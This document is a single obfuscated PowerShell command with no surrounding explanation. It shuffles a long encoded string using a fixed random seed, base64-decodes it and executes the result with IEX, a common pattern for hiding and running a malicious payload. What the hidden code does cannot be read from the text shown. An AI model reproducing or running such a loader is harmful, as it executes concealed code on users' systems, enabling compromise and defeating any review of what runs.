$mvhij = [Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes('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') | Sort-Object { Get-Random -SetSeed 1321827412 })); $mSdUx = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($mvhij)); IEX $mSdUx
